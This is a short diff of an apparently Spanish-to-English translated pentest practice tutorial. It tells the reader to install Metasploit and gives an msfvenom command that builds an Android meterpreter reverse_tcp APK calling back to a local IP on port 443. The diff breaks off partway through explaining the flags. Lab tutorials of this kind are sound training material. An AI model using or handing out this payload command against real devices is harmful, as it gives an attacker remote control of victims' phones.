@@ -26,4 +26,17 @@ In this first practice we will use msfvenom to create an application which will 
 
    >[!IMPORTANT]
    >
-   >Recuerda conectarte al servidor con tu android en este caso deben estar en la misma red ya que el servidor es local al igual que nuestro ataque
+   >Remember to connect to the server with your android, in this case they must be on the same network since the server is local, just like our attack.
+
+
+ >[!INFO]
+ >
+ >If you do not have kali metasploit installed on your system, you must install it `sudo apt install metasploit-framework`
+
+
+#### We use msfvenom
+┌──(root㉿CarlosSantos)-[/home/kali]
+└─# `msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.4.239 LPORT=443 -o practice.apk`
+
+1. *msfvenom: Es el nombre del comando que invoca la herramienta msfvenom.
+-p *
